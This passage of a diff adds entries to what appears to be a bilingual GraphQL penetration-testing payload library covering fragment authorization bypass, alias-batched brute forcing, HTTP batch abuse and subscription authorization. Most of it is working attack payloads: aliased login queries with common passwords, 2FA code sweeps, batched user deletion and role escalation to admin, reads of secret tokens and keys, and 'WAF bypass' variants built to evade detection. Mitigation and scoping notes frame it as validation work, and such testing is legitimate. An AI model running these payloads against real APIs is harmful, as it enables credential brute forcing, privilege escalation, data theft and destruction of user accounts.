+      "en": "Nested Dual-Fragment Escalation"
+     },
+     "command": "query{user(id:1){...A ...B}} fragment A on Admin{id username} fragment B on RootAdmin{role secretToken}",
+     "description": {
+      "zh": "双片段组合绕过单片段的字段授权检查。成功判据：返回特权片段字段。",
+      "en": "Dual fragments bypass field authorization applied per single fragment. Success: privileged fragment fields return."
+     },
+     "syntaxBreakdown": [
+      {
+       "part": "query{user(id:1){...A ...B}}",
+       "explanation": {
+        "zh": "双片段展开",
+        "en": "Dual fragment spread"
+       },
+       "type": "payload"
+      },
+      {
+       "part": "fragment B on RootAdmin{role secretToken}",
+       "explanation": {
+        "zh": "特权片段定义",
+        "en": "Privileged fragment def"
+       },
+       "type": "payload"
+      }
+     ]
+    },
+    {
+     "title": {
+      "zh": "变量条件片段",
+      "en": "Variable-Conditional Fragment"
+     },
+     "command": "{\"query\":\"query($b:Boolean!){user(id:1){...A @include(if:$b)}} fragment A on Admin{id email role secretToken}\",\"variables\":{\"b\":true}}",
+     "description": {
+      "zh": "片段执行与否由变量控制，绕过静态字段审计。成功判据：变量开启时返回特权字段。",
+      "en": "Fragment execution toggled by a variable bypasses static field auditing. Success: privileged fields return when the variable is on."
+     },
+     "syntaxBreakdown": [
+      {
+       "part": "{\"query\":\"query($b:Boolean!){user(id:1){...A @include(if:$b)}}",
+       "explanation": {
+        "zh": "变量控制片段",
+        "en": "Variable-controlled fragment"
+       },
+       "type": "payload"
+      },
+      {
+       "part": "\"variables\":{\"b\":true}",
+       "explanation": {
+        "zh": "开启片段的变量",
+        "en": "Fragment-enabling variable"
+       },
+       "type": "value"
+      }
+     ]
+    },
+    {
+     "title": {
+      "zh": "别名复用特权字段",
+      "en": "Alias-Reuse Privileged Fields"
+     },
+     "command": "query{user(id:1){a:id b:email c:role d:secretToken}}",
+     "description": {
+      "zh": "别名映射敏感字段绕过字段名白名单。成功判据：别名项返回敏感值。",
+      "en": "Aliasing sensitive fields bypasses field-name whitelists. Success: aliased entries return sensitive values."
+     },
+     "syntaxBreakdown": [
+      {
+       "part": "query{user(id:1){a:id b:email c:role d:secretToken}}",
+       "explanation": {
+        "zh": "别名映射字段",
+        "en": "Alias-mapped fields"
+       },
+       "type": "payload"
+      },
+      {
+       "part": "d:secretToken",
+       "explanation": {
+        "zh": "别名取敏感字段",
+        "en": "Aliased sensitive field"
+       },
+       "type": "payload"
+      }
+     ]
+    }
+   ],
+   "execution": [
+    {
+     "title": {
+      "zh": "内联片段绕过授权",
+      "en": "Validation step 1 for GraphQL Inline-Fragment Field Authorization Validation"
+     },
+     "command": "{user(id:1){...on Admin{id username email role secretToken}}}\n{user(id:1){...on Admin{id username password apikey}}}\n{user(id:1){...on Admin{id username role isAdmin permissions}}}\n{user(id:1){...on SuperUser{id username role}}}\n{user(id:1){...on Root{id username role}}}\n{user(id:1){...on Internal{id config secret}}}\n{users{...on Admin{id username email role}}}\n{me{...on Admin{id username email role secretToken}}}\n{currentUser{...on Admin{id username email role}}}\n{profile{...on Admin{id username email role}}}\nquery{...AdminFields} fragment AdminFields on Query{admin{id username role secretToken}}\nquery{...UserFields} fragment UserFields on Query{users{id username email role isAdmin}}\nquery{...ConfigFields} fragment ConfigFields on Query{config{databaseKey apiSecret jwtSecret}}\n{node(id:\"1\"){...on User{id email}...on Admin{id email role secret}}}\n{search(query:\"admin\"){...on User{id email}...on Admin{id email role secret}}}",
+     "description": {
+      "zh": "把内联片段变体逐条提交；越权字段（secretToken、password、role）随片段返回，即确认字段级授权缺失。",
+      "en": "Submit each inline-fragment variant; unauthorized fields (secretToken, password, role) returned via fragments confirm missing field-level authorization."
+     },
+     "syntaxBreakdown": [
+      {
+       "part": "{user(id:1){...on Admin{id username email role secretToken}}}",
+       "explanation": {
+        "zh": "Admin 内联片段",
+        "en": "Admin inline fragment"
+       },
+       "type": "payload"
+      },
+      {
+       "part": "{user(id:1){...on Root{id username role}}}",
+       "explanation": {
+        "zh": "Root 内联片段",
+        "en": "Root inline fragment"
+       },
+       "type": "payload"
+      },
+      {
+       "part": "query{...AdminFields} fragment AdminFields on Query{admin{id username role secretToken}}",
+       "explanation": {
+        "zh": "具名片段组合",
+        "en": "Named fragment combo"
+       },
+       "type": "payload"
+      },
+      {
+       "part": "{node(id:\"1\"){...on User{id email}...on Admin{id email role secret}}}",
+       "explanation": {
+        "zh": "节点双类型片段",
+        "en": "Node dual-type fragments"
+       },
+       "type": "payload"
+      }
+     ],
+     "platform": "all",
+     "requiresAdmin": false
+    }
+   ],
+   "tags": [
+    "api2"
+   ]
+  },
+  {
+   "id": "api2-alias",
+   "name": {
+    "zh": "GraphQL Alias 批量操作限流验证",
+    "en": "GraphQL Alias Batch-Operation Rate-Limit Validation"
+   },
+   "description": {
+    "zh": "验证服务端是否按一次 HTTP 请求而不是按实际 resolver 操作计数，导致登录、二次验证或对象查询可通过多个 Alias 在单次文档中绕过速率和成本限制。",
+    "en": "Validate whether the server counts only HTTP requests instead of resolver operations, allowing login, second-factor, or object lookups under multiple aliases to bypass rate and cost limits in one document."
+   },
+   "category": {
+    "zh": "API安全",
+    "en": "API Security"
+   },
+   "subCategory": {
+    "zh": "批量查询与资源滥用",
+    "en": "Batch Queries & Resource Abuse"
+   },
+   "prerequisites": [
+    {
+     "zh": "使用专用测试账户和可重置的验证码流程，并获得明确的请求速率上限。",
+     "en": "Use a dedicated test account and resettable verification flow, with an explicitly approved request-rate ceiling."
+    },
+    {
+     "zh": "记录单操作请求的计数器、响应扩展、认证日志和锁定行为。",
+     "en": "Record counters, response extensions, authentication logs, and lockout behavior for a single-operation request."
+    }
+   ],
+   "tutorial": {
+    "overview": {
+     "zh": "该 Payload 覆盖 GraphQL Alias 批量操作限流场景，检验限流按请求还是按 resolver 计数的实现差异。验证维度为多别名登录与验证码查询的单文档矩阵，对应第 1 步。",
+     "en": "This payload covers GraphQL alias-batched operation rate limiting, testing whether throttles count requests or resolver invocations. Validation is a single-document matrix of multi-alias logins and code queries, mapped to step 1."
+    },
+    "vulnerability": {
+     "zh": "根因在于限流器挂在 HTTP 层而文档内 alias 可打包任意多次尝试：单请求完成上百次登录或验证码猜测，暴力破解效率被放大百倍。",
+     "en": "The root cause is throttles mounted at the HTTP layer while aliases pack unlimited attempts into one document: a single request performs hundreds of login or code guesses, multiplying brute-force efficiency a hundredfold."
+    },
+    "exploitation": {
+     "zh": "第 1 步按脚本构造携带多别名登录或验证码查询的文档逐条提交，记录响应中各 alias 的独立结果：单请求内多次尝试全部独立执行即确认别名绕过限流，统计单文档最大尝试容量。成功判据以多 alias 独立响应为准。占位符在全局变量菜单替换。",
+     "en": "In step 1, build documents carrying multi-alias logins or code queries and submit one by one per the script, recording each alias's independent result; all attempts within one request executing independently confirm the alias throttle bypass, with per-document attempt capacity tallied. Judge success by independent multi-alias responses. Replace placeholders via the global variables menu."
+    },
+    "mitigation": {
+     "zh": "限流按文档内操作数与主体双层计数并限制别名数量，登录类 resolver 强制独立节流。修复后重放第 1 步，超限文档应在校验阶段被拒绝。",
+     "en": "Throttle per document-operation counts and principals with alias caps, enforcing independent throttles on login-type resolvers. After the fix, replay step 1: over-limit documents should be rejected at validation."
+    },
+    "difficulty": "advanced"
+   },
+   "attackChain": [
+    {
+     "title": {
+      "zh": "测量单操作计数",
+      "en": "Measure single-operation accounting"
+     },
+     "description": {
+      "zh": "发送一个无效测试值，记录账户计数器、解析器调用和锁定阈值。",
+      "en": "Send one invalid test value and record the account counter, resolver calls, and lockout threshold."
+     },
+     "payload": "query{a1:login(username:\"admin\",password:\"password1\"){token} a2:login(username:\"admin\",password:\"password2\"){token} a3:login(username:\"admin\",password:\"password3\"){token} a4:login(username:\"admin\",password:\"password4\"){token} a5:login(username:\"admin\",password:\"password5\"){token}} \n query{a1:login(username:\"admin\",password:\"123456\"){token} a2:login(username:\"admin\",password:\"admin\"){token} a3:login(username:\"admin\",password:\"password\"){token} a4:login(username:\"admin\",password:\"qwerty\"){token} a5:login(username:\"admin\",password:\"letmein\"){token}} \n mutation{a1:verify2FA(code:\"000000\"){success} a2:verify2FA(code:\"000001\"){success} a3:verify2FA(code:\"000002\"){success} a4:verify2FA(code:\"000003\"){success} a5:verify2FA(code:\"000004\"){success}} \n mutation{a1:verify2FA(code:\"111111\"){success} a2:verify2FA(code:\"111112\"){success} a3:verify2FA(code:\"111113\"){success} a4:verify2FA(code:\"111114\"){success} a5:verify2FA(code:\"111115\"){success}} \n query{a1:user(id:1){id username} a2:user(id:2){id username} a3:user(id:3){id username} a4:user(id:4){id username} a5:user(id:5){id username}} \n query{a1:user(email:\"admin@example.com\"){id} a2:user(email:\"user1@example.com\"){id} a3:user(email:\"user2@example.com\"){id}}"
+    },
+    {
+     "title": {
+      "zh": "提交受限 Alias 集合",
+      "en": "Submit a bounded alias set"
+     },
+     "description": {
+      "zh": "使用原始 Alias 请求但限制在批准的少量测试值，观察实际执行操作数。",
+      "en": "Use the original alias request with a small approved set of test values and observe the number of operations actually executed."
+     },
+     "payload": "query{a1:login(username:\"admin\",password:\"password1\"){token} a2:login(username:\"admin\",password:\"password2\"){token} a3:login(username:\"admin\",password:\"password3\"){token} a4:login(username:\"admin\",password:\"password4\"){token} a5:login(username:\"admin\",password:\"password5\"){token}} \n query{a1:login(username:\"admin\",password:\"123456\"){token} a2:login(username:\"admin\",password:\"admin\"){token} a3:login(username:\"admin\",password:\"password\"){token} a4:login(username:\"admin\",password:\"qwerty\"){token} a5:login(username:\"admin\",password:\"letmein\"){token}} \n mutation{a1:verify2FA(code:\"000000\"){success} a2:verify2FA(code:\"000001\"){success} a3:verify2FA(code:\"000002\"){success} a4:verify2FA(code:\"000003\"){success} a5:verify2FA(code:\"000004\"){success}} \n mutation{a1:verify2FA(code:\"111111\"){success} a2:verify2FA(code:\"111112\"){success} a3:verify2FA(code:\"111113\"){success} a4:verify2FA(code:\"111114\"){success} a5:verify2FA(code:\"111115\"){success}} \n query{a1:user(id:1){id username} a2:user(id:2){id username} a3:user(id:3){id username} a4:user(id:4){id username} a5:user(id:5){id username}} \n query{a1:user(email:\"admin@example.com\"){id} a2:user(email:\"user1@example.com\"){id} a3:user(email:\"user2@example.com\"){id}}"
+    },
+    {
+     "title": {
+      "zh": "关联限流与认证日志",
+      "en": "Correlate throttling and authentication logs"
+     },
+     "description": {
+      "zh": "比较 HTTP 请求数、resolver 调用数和失败计数，确认是否存在计费差异。",
+      "en": "Compare HTTP request count, resolver invocation count, and failure counters to identify accounting differences."
+     },
+     "payload": "query{a:login(username:\"admin\",password:\"pw1\"){...C} b:login(username:\"admin\",password:\"pw2\"){...C} c:login(username:\"admin\",password:\"pw3\"){...C}} fragment C on AuthToken{token user{id role}}"
+    },
+    {
+     "title": {
+      "zh": "加入操作级限制并复测",
+      "en": "Add operation-level limits and retest"
+     },
+     "description": {
+      "zh": "限制 Alias 和查询成本后重放相同文档，确认每个敏感操作均被独立计数或整体拒绝。",
+      "en": "After limiting aliases and query cost, replay the document and confirm every sensitive operation is metered independently or the document is rejected."
+     },
+     "payload": ""
+    }
+   ],
+   "references": [
+    "https://graphql.org/learn/security/",
+    "https://cheatsheetseries.owasp.org/cheatsheets/GraphQL_Cheat_Sheet.html"
+   ],
+   "analysis": {
+    "zh": "确认依据是一次 HTTP 请求实际执行多个敏感 resolver，且后端失败计数或成本只增加一次。仅支持 Alias、返回多个普通查询结果或网关记录一个请求不等于限流绕过。",
+    "en": "Confirmation requires one HTTP request to execute multiple sensitive resolvers while backend failure or cost accounting increments only once. Alias support, multiple ordinary results, or one gateway request log alone does not prove a bypass."
+   },
+   "opsecTips": [
+    {
+     "zh": "只使用专用账户和少量无效测试值，不进行凭证字典或验证码空间遍历。",
+     "en": "Use a dedicated account and a few invalid test values; do not traverse credential dictionaries or verification-code spaces."
+    },
+    {
+     "zh": "设置最大 Alias 数和立即停止阈值，监控锁定与下游调用。",
+     "en": "Set a maximum alias count and immediate stop threshold while monitoring lockout and downstream calls."
+    }
+   ],
+   "review": {
+    "decision": "payload",
+    "rationale": "原始内容是 Alias 组合请求，用于验证操作级限流；不是工具命令，用户枚举样例作为同一计费边界的对照保留。",
+    "issuesResolved": [
+     "corrected-name",
+     "bounded-bruteforce-scope",
+     "added-prerequisites",
+     "added-four-part-tutorial",
+     "rewrote-specific-attack-chain",
+     "added-analysis-opsec",
+     "added-authoritative-references",
+     "preserved-source-command"
+    ]
+   },
+   "wafBypass": [
+    {
+     "title": {
+      "zh": "变量数组批量凭据",
+      "en": "Variable-Array Batch Credentials"
+     },
+     "command": "{\"query\":\"query($u:[String!]!,$p:[String!]!){r:loginBatch(user:$u,pass:$p){token}}\",\"variables\":{\"u\":[\"admin\",\"admin\",\"admin\"],\"p\":[\"password1\",\"password2\",\"password3\"]}}",
+     "description": {
+      "zh": "凭据移入变量数组绕过查询体特征与单查询限速。成功判据：批量返回至少一个 token。",
+      "en": "Credentials moved into variable arrays bypass query signatures and per-query limits. Success: at least one token returns in batch."
+     },
+     "syntaxBreakdown": [
+      {
+       "part": "{\"query\":\"query($u:[String!]!,$p:[String!]!){r:loginBatch(user:$u,pass:$p){token}}\"",
+       "explanation": {
+        "zh": "变量数组批量",
+        "en": "Variable-array batch"
+       },
+       "type": "payload"
+      },
+      {
+       "part": "\"u\":[\"admin\",\"admin\",\"admin\"]",
+       "explanation": {
+        "zh": "用户名数组取值",
+        "en": "Username array value"
+       },
+       "type": "value"
+      }
+     ]
+    },
+    {
+     "title": {
+      "zh": "片段复用别名",
+      "en": "Fragment-Reuse Aliases"
+     },
+     "command": "query{a:login(username:\"admin\",password:\"pw1\"){...C} b:login(username:\"admin\",password:\"pw2\"){...C} c:login(username:\"admin\",password:\"pw3\"){...C}} fragment C on AuthToken{token user{id role}}",
+     "description": {
+      "zh": "共享片段承载批量别名降低查询长度特征。成功判据：限速未触发且返回多个结果。",
+      "en": "A shared fragment carries batched aliases, lowering length signatures. Success: no rate limit triggers and multiple results return."
+     },
+     "syntaxBreakdown": [
+      {
+       "part": "query{a:login(...){...C} b:login(...){...C} c:login(...){...C}}",
+       "explanation": {
+        "zh": "共享片段别名",
+        "en": "Shared-fragment aliases"
+       },
+       "type": "payload"
+      },
+      {
+       "part": "fragment C on AuthToken{token user{id role}}",
+       "explanation": {
+        "zh": "共享令牌片段",
+        "en": "Shared token fragment"
+       },
+       "type": "payload"
+      }
+     ]
+    },
+    {
+     "title": {
+      "zh": "单字母别名变形",
+      "en": "Single-Letter Alias Mutation"
+     },
+     "command": "query{a1:login(username:\"admin\",password:\"pw1\"){token} b1:login(username:\"admin\",password:\"pw2\"){token} c1:login(username:\"admin\",password:\"pw3\"){token}}",
+     "description": {
+      "zh": "规律别名前缀与最小长度绕过批量查询检测的长度阈值。成功判据：单请求完成多次尝试。",
+      "en": "Regular alias prefixes with minimal length bypass batch-detection thresholds. Success: multiple attempts complete in one request."
+     },
+     "syntaxBreakdown": [
+      {
+       "part": "query{a1:login(username:\"admin\",password:\"pw1\"){token}",
+       "explanation": {
+        "zh": "短前缀别名登录",
+        "en": "Short-prefix alias login"
+       },
+       "type": "payload"
+      },
+      {
+       "part": "c1:login(username:\"admin\",password:\"pw3\"){token}}",
+       "explanation": {
+        "zh": "第三别名登录",
+        "en": "Third alias login"
+       },
+       "type": "payload"
+      }
+     ]
+    }
+   ],
+   "execution": [
+    {
+     "title": {
+      "zh": "Alias批量查询 (暴力破解绕过)",
+      "en": "Validation step 1 for GraphQL Alias Batch-Operation Rate-Limit Validation"
+     },
+     "command": "query{a1:login(username:\"admin\",password:\"password1\"){token} a2:login(username:\"admin\",password:\"password2\"){token} a3:login(username:\"admin\",password:\"password3\"){token} a4:login(username:\"admin\",password:\"password4\"){token} a5:login(username:\"admin\",password:\"password5\"){token}} \n query{a1:login(username:\"admin\",password:\"123456\"){token} a2:login(username:\"admin\",password:\"admin\"){token} a3:login(username:\"admin\",password:\"password\"){token} a4:login(username:\"admin\",password:\"qwerty\"){token} a5:login(username:\"admin\",password:\"letmein\"){token}} \n mutation{a1:verify2FA(code:\"000000\"){success} a2:verify2FA(code:\"000001\"){success} a3:verify2FA(code:\"000002\"){success} a4:verify2FA(code:\"000003\"){success} a5:verify2FA(code:\"000004\"){success}} \n mutation{a1:verify2FA(code:\"111111\"){success} a2:verify2FA(code:\"111112\"){success} a3:verify2FA(code:\"111113\"){success} a4:verify2FA(code:\"111114\"){success} a5:verify2FA(code:\"111115\"){success}} \n query{a1:user(id:1){id username} a2:user(id:2){id username} a3:user(id:3){id username} a4:user(id:4){id username} a5:user(id:5){id username}} \n query{a1:user(email:\"admin@example.com\"){id} a2:user(email:\"user1@example.com\"){id} a3:user(email:\"user2@example.com\"){id}}",
+     "description": {
+      "zh": "把别名批量登录与验证码查询逐条提交；单请求内多次尝试均被独立处理，即确认别名绕过限流。",
+      "en": "Submit each alias-batched login or code query; multiple attempts inside one request processed independently confirms alias-based rate-limit bypass."
+     },
+     "syntaxBreakdown": [
+      {
+       "part": "query{a1:login(username:\"admin\",password:\"password1\"){token}",
+       "explanation": {
+        "zh": "别名批量登录",
+        "en": "Aliased batch login"
+       },
+       "type": "payload"
+      },
+      {
+       "part": "mutation{a1:verify2FA(code:\"000000\"){success}",
+       "explanation": {
+        "zh": "别名批量二步验证",
+        "en": "Aliased batch 2FA"
+       },
+       "type": "payload"
+      },
+      {
+       "part": "query{a1:user(id:1){id username}",
+       "explanation": {
+        "zh": "别名批量对象查询",
+        "en": "Aliased batch query"
+       },
+       "type": "payload"
+      },
+      {
+       "part": "{token}",
+       "explanation": {
+        "zh": "令牌返回字段",
+        "en": "Token return field"
+       },
+       "type": "value"
+      }
+     ],
+     "platform": "all",
+     "requiresAdmin": false
+    }
+   ],
+   "tags": [
+    "api2",
+    "alias"
+   ]
+  },
+  {
+   "id": "api2-batch-query",
+   "name": {
+    "zh": "GraphQL HTTP 批处理策略验证",
+    "en": "GraphQL HTTP Batch Policy Validation"
+   },
+   "description": {
+    "zh": "验证 GraphQL HTTP 端点接受请求数组时，是否对数组内每个操作分别执行认证、授权、成本、事务和速率限制，而不是只检查外层请求。",
+    "en": "Validate whether a GraphQL HTTP endpoint that accepts request arrays applies authentication, authorization, cost, transaction, and rate controls to every enclosed operation rather than only the outer request."
+   },
+   "category": {
+    "zh": "API安全",
+    "en": "API Security"
+   },
+   "subCategory": {
+    "zh": "批量查询与资源滥用",
+    "en": "Batch Queries & Resource Abuse"
+   },
+   "prerequisites": [
+    {
+     "zh": "已确认目标明确支持 GraphQL 批处理，并准备只含测试数据的读写操作。",
+     "en": "The target explicitly supports GraphQL batching and read/write operations containing test data only are prepared."
+    },
+    {
+     "zh": "已记录单请求的认证、授权、成本、事务和错误返回基线。",
+     "en": "Authentication, authorization, cost, transaction, and error baselines for a single request have been recorded."
+    }
+   ],
+   "tutorial": {
+    "overview": {
+     "zh": "该 Payload 覆盖 GraphQL HTTP 批处理策略场景，检验数组批处理下逐操作的认证、授权与成本控制。验证维度为混合查询数组与批量 mutation 的提交矩阵，对应第 1 步。",
+     "en": "This payload covers GraphQL HTTP batching policy, testing per-operation authentication, authorization and cost control under array batching. Validation is a submission matrix of mixed query arrays and batched mutations, mapped to step 1."
+    },
+    "vulnerability": {
+     "zh": "根因在于中间件只校验批处理请求的外层封装而数组内操作逐一逃逸检查：低权会话一次请求完成多条越权查询，限流与审计同时失效。",
+     "en": "The root cause is middleware validating only the batch envelope while arrayed operations individually escape checks: low-privilege sessions run many unauthorized queries per request as throttles and audits fail together."
+    },
+    "exploitation": {
+     "zh": "第 1 步按脚本把混合权限查询与批量 mutation 数组逐条提交 GraphQL 端点，记录数组内每条操作的执行结果：多条操作一次性执行且含越权结果即确认批处理策略缺失。成功判据以数组内操作结果矩阵为准。占位符在全局变量菜单替换。",
+     "en": "In step 1, submit mixed-privilege query arrays and batched mutations to the GraphQL endpoint one by one per the script, recording each arrayed operation's outcome; multiple operations executing at once with unauthorized results among them confirm missing batching policy. Judge success by the arrayed-operation outcome matrix. Replace placeholders via the global variables menu."
+    },
+    "mitigation": {
+     "zh": "禁用或严格限制 HTTP 批处理并对数组内每条操作独立走鉴权与成本核算，超限整批拒绝。修复后重放第 1 步矩阵，越权操作应逐条失败。",
+     "en": "Disable or strictly limit HTTP batching, running authentication and cost accounting independently per arrayed operation and rejecting whole batches over limit. After the fix, replay the step 1 matrix: unauthorized operations should fail individually."
+    },
+    "difficulty": "advanced"
+   },
+   "attackChain": [
+    {
+     "title": {
+      "zh": "确认批处理协议与基线",
+      "en": "Confirm batch protocol and baseline"
+     },
+     "description": {
+      "zh": "用两个无害查询确认数组格式、元素顺序、错误结构和服务端日志关联方式。",
+      "en": "Use two harmless queries to confirm array format, element ordering, error structure, and server-log correlation."
+     },
+     "payload": ""
+    },
+    {
+     "title": {
+      "zh": "加入拒绝与可回滚操作",
+      "en": "Add a denial and reversible operation"
+     },
+     "description": {
+      "zh": "在测试数据上提交原始批处理形态，逐项观察身份、授权和事务边界。",
+      "en": "Submit the original batch shape against test data and observe identity, authorization, and transaction boundaries per element."
+     },
+     "payload": ""
+    },
+    {
+     "title": {
+      "zh": "核对元素级成本与副作用",
+      "en": "Check element-level cost and side effects"
+     },
+     "description": {
+      "zh": "比较外层请求计数与内部操作、数据库提交和审计事件，定位控制作用域差异。",
+      "en": "Compare outer-request accounting with inner operations, database commits, and audit events to locate control-scope mismatches."
+     },
+     "payload": ""
+    },
+    {
+     "title": {
+      "zh": "限制批大小并验证隔离",
+      "en": "Limit batch size and validate isolation"
+     },
+     "description": {
+      "zh": "应用数组长度、总成本和元素级授权后重放，确认部分失败不会越权或污染其他元素。",
+      "en": "After applying array-length, aggregate-cost, and per-element authorization controls, replay and confirm partial failures cannot authorize or contaminate other elements."
+     },
+     "payload": "curl -sS --max-time 5 -X POST http://{TARGET}/graphql -H \"Content-Type: application/json\" -d '{\"operationName\":\"legitQuery\",\"query\":\"mutation legitQuery{config{secretKey}}\"}'"
+    }
+   ],
+   "references": [
+    "https://graphql.org/learn/serving-over-http/",
+    "https://cheatsheetseries.owasp.org/cheatsheets/GraphQL_Cheat_Sheet.html"
+   ],
+   "analysis": {
+    "zh": "接受批请求本身不是漏洞。必须证明某个内部操作绕过了单操作时存在的授权、限流、成本或事务控制，并能通过元素级日志和状态变化重复验证。",
+    "en": "Accepting batch requests is not itself a vulnerability. A finding requires an inner operation to bypass authorization, rate, cost, or transaction controls that apply to the same standalone operation, confirmed through element-level logs and state."
+   },
+   "opsecTips": [
+    {
+     "zh": "将删除和角色修改示例替换为专用测试对象上的可回滚标记写入。",
+     "en": "Replace deletion and role-change examples with reversible marker writes on dedicated test objects."
+    },
+    {
+     "zh": "从两个元素开始并限制总复杂度，观察资源指标后再停止。",
+     "en": "Start with two elements, cap aggregate complexity, and stop after observing resource metrics."
+    }
+   ],
+   "review": {
+    "decision": "payload",
+    "rationale": "所有行共享 GraphQL HTTP 批处理控制边界，属于协议请求 Payload；教程明确禁止直接运行高影响示例。",
+    "issuesResolved": [
+     "corrected-name",
+     "clarified-nonstandard-batching",
+     "bounded-impact",
+     "added-prerequisites",
+     "added-four-part-tutorial",
+     "rewrote-specific-attack-chain",
+     "added-analysis-opsec",
+     "added-authoritative-references",
+     "preserved-source-command"
+    ]
+   },
+   "wafBypass": [
+    {
+     "title": {
+      "zh": "content-type 变换批处理",
+      "en": "content-type Batch Swap"
+     },
+     "command": "curl -sS --max-time 5 -X POST http://{TARGET}/graphql -H \"Content-Type: text/plain\" -d '[{\"query\":\"{me{id}}\"},{\"query\":\"{users{id email}}\"}]'",
+     "description": {
+      "zh": "text/plain 携带批处理数组绕过 JSON 数组体特征。成功判据：数组被解析为批查询。",
+      "en": "text/plain carrying a batch array bypasses JSON-array body signatures. Success: the array parses as batched queries."
+     },
+     "syntaxBreakdown": [
+      {
+       "part": "-H \"Content-Type: text/plain\"",
+       "explanation": {
+        "zh": "纯文本类型头",
+        "en": "Plain text content type"
+       },
+       "type": "header"
+      },
+      {
+       "part": "-d '[{\"query\":\"{me{id}}\"},{\"query\":\"{users{id email}}\"}]'",
+       "explanation": {
+        "zh": "text/plain 批数组",
+        "en": "text/plain batch array"
+       },
+       "type": "payload"
+      },
+      {
+       "part": "http://{TARGET}/graphql",
+       "explanation": {
+        "zh": "GraphQL 端点",
+        "en": "GraphQL endpoint"
+       },
+       "type": "url"
+      }
+     ]
+    },
+    {
+     "title": {
+      "zh": "混合 mutation 批处理",
+      "en": "Mixed-Mutation Batching"
+     },
+     "command": "[{\"query\":\"{users{id email}}\"},{\"query\":\"mutation{deleteUser(id:1){id}}\"},{\"query\":\"{config{secretKey}}\"}]",
+     "description": {
+      "zh": "读操作夹带 mutation 绕过按操作类型分流的限速。成功判据：删除与敏感读同批执行。",
+      "en": "Reads smuggling a mutation bypass per-operation-type rate limits. Success: the delete and sensitive read execute in one batch."
+     },
+     "syntaxBreakdown": [
+      {
+       "part": "[{\"query\":\"{users{id email}}\"}",
+       "explanation": {
+        "zh": "读操作打头",
+        "en": "Read operation first"
+       },
+       "type": "payload"
+      },
+      {
+       "part": "{\"query\":\"mutation{deleteUser(id:1){id}}\"}",
+       "explanation": {
+        "zh": "夹带删除操作",
+        "en": "Smuggled delete operation"
+       },
+       "type": "payload"
+      },
+      {
+       "part": "{\"query\":\"{config{secretKey}}\"}",
+       "explanation": {
+        "zh": "夹带敏感读取",
+        "en": "Smuggled sensitive read"
+       },
+       "type": "payload"
+      }
+     ]
+    },
+    {
+     "title": {
+      "zh": "operationName 变形",
+      "en": "operationName Mutation"
+     },
+     "command": "curl -sS --max-time 5 -X POST http://{TARGET}/graphql -H \"Content-Type: application/json\" -d '{\"operationName\":\"legitQuery\",\"query\":\"mutation legitQuery{config{secretKey}}\"}'",
+     "description": {
+      "zh": "operationName 标签伪装为合法查询绕过审计。成功判据：敏感 mutation 执行成功。",
+      "en": "An operationName labeled as a legit query bypasses auditing. Success: the sensitive mutation executes."
+     },
+     "syntaxBreakdown": [
+      {
+       "part": "'{\"operationName\":\"legitQuery\",\"query\":\"mutation m{config{secretKey}}\"}'",
+       "explanation": {
+        "zh": "标签伪装的操作",
+        "en": "Mislabeled operation"
+       },
+       "type": "payload"
+      },
+      {
+       "part": "\"operationName\":\"legitQuery\"",
+       "explanation": {
+        "zh": "合法化标签",
+        "en": "Legit-looking label"
+       },
+       "type": "value"
+      }
+     ]
+    }
+   ],
+   "execution": [
+    {
+     "title": {
+      "zh": "Batch query攻击",
+      "en": "Validation step 1 for GraphQL HTTP Batch Policy Validation"
+     },
+     "command": "[{\"query\":\"{me{id email role}}\"},{\"query\":\"{users{id email role}}\"},{\"query\":\"{config{secretKey}}\"}]\n[{\"query\":\"mutation{login(username:\\\"admin\\\",password:\\\"pass1\\\"){token}}\"},{\"query\":\"mutation{login(username:\\\"admin\\\",password:\\\"pass2\\\"){token}}\"},{\"query\":\"mutation{login(username:\\\"admin\\\",password:\\\"pass3\\\"){token}}\"}]\n[{\"query\":\"{admin{secretToken}}\"},{\"query\":\"{admin{apiKey}}\"},{\"query\":\"{admin{password}}\"}]\n[{\"query\":\"mutation{deleteUser(id:1){success}}\"},{\"query\":\"mutation{deleteUser(id:2){success}}\"},{\"query\":\"mutation{deleteUser(id:3){success}}\"}]\n[{\"query\":\"{users{id email}}\"},{\"query\":\"mutation{updateUser(id:1,role:\\\"admin\\\"){success}}\"},{\"query\":\"mutation{updateUser(id:2,role:\\\"admin\\\"){success}}\"}]",
+     "description": {
+      "zh": "把批处理 JSON 逐条提交 GraphQL 端点；数组内操作一次性执行且某条操作绕过单请求时存在的授权/限流/成本控制，即确认批处理策略缺失。",
+      "en": "Submit each batching JSON to the GraphQL endpoint; multiple queries or mutations in one array executing confirms missing batch policy."
+     },
+     "syntaxBreakdown": [
+      {
+       "part": "[{\"query\":\"{me{id email role}}\"},{\"query\":\"{users{id email role}}\"},{\"query\":\"{config{secretKey}}\"}]",
+       "explanation": {
+        "zh": "混合权限批查询",
+        "en": "Mixed-privilege batch"
+       },
+       "type": "payload"
+      },
+      {
+       "part": "[{\"query\":\"mutation{login(username:\\\"admin\\\",password:\\\"pass1\\\"){token}}\"",
+       "explanation": {
+        "zh": "批量登录数组",
+        "en": "Batch login array"
+       },
+       "type": "payload"
+      },
+      {
+       "part": "[{\"query\":\"mutation{deleteUser(id:1){success}}\"",
+       "explanation": {
+        "zh": "批量删除数组",
+        "en": "Batch delete array"
+       },
+       "type": "payload"
+      },
+      {
+       "part": "{\"query\":\"{admin{secretToken}}\"}",
+       "explanation": {
+        "zh": "敏感读操作",
+        "en": "Sensitive read operation"
+       },
+       "type": "payload"
+      }
+     ],
+     "platform": "all",
+     "requiresAdmin": false
+    }
+   ],
+   "tags": [
+    "api2",
+    "batch_query"
+   ]
+  },
+  {
+   "id": "api2-subscription",
+   "name": {
+    "zh": "GraphQL Subscription 订阅授权验证",
+    "en": "GraphQL Subscription Authorization Validation"
+   },
+   "description": {
+    "zh": "验证 Subscription 在连接建立、订阅注册和每次事件投递阶段是否持续执行主体、租户、主题和字段授权，防止低权限连接接收其他对象的敏感事件。",
+    "en": "Validate whether GraphQL subscriptions continuously enforce principal, tenant, topic, and field authorization during connection setup, subscription registration, and each event delivery."
+   },
+   "category": {
+    "zh": "API安全",
+    "en": "API Security"
+   },
+   "subCategory": {
+    "zh": "GraphQL 授权与 IDOR",
+    "en": "GraphQL Authorization & IDOR"
+   },
+   "prerequisites": [
+    {
+     "zh": "准备两个测试租户或用户、隔离的事件源和可识别的非敏感事件值。",
+     "en": "Prepare two test tenants or users, isolated event sources, and identifiable nonsensitive event values."
+    },
+    {
+     "zh": "记录 WebSocket 或 SSE 握手、连接参数、订阅确认和事件投递日志。",
